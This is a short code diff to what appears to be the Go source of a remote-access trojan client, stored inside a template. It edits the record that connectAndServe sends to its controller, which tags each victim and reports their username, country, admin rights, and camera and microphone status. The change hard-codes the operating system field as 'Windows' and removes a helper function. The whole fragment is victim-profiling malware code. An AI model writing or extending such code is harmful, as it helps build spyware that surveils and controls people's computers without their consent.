@@ -464,7 +464,7 @@ func connectAndServe(ctx context.Context, endpoint string) error {{
         VictimTag:        ""{tag}"",
         Username:         usernameOrDefault(),
         Country:          userCountry(),
-        UserOS:           runtimeName(),
+        UserOS:           ""Windows"",
         AdminStatus:      getAdminStatus(),
         CameraStatus:     getCameraStatus(),
         MicrophoneStatus: getMicrophoneStatus(),
@@ -615,10 +615,6 @@ func usernameOrDefault() string {{
         return user
     }}
     return ""client""
-}}
-
-func runtimeName() string {{
-    return ""windows""
 }}
 
 func endpointHost(endpoint string) string {{
